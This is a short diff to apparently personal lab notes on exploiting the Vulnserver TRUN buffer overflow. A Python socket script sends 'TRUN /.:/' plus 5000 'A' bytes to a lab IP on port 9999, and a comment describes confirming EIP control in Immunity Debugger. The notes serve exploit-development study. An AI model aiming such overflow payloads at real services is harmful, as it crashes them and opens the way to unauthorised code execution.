@@ -21,7 +21,7 @@ buf = "TRUN /.:/"
 buf += "A" * 5000
 
 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating Socket, IPv4 TCP
-s.connect(("192.168.65.20", 9999)) ## Define host and port
+s.connect(("192.168.65.10",9999)) ## Define host and port
 print s.recv(1024) ## Print to screen the response
 s.send(buf) ## Send variable buf
 print s.recv(1024) ## Print to screen the response
@@ -49,7 +49,7 @@ ________________________________________________________________________________
 ### Rewind the immunitydebugger and run again
 #### Make sure the script it saved and run it again, should get back 42424242 in the EIP field
 _________________________________________________________________________________________________________________
-### 
+### Can delete the "BBBB" line, just to ensure it ran properly
 #### 
 
 
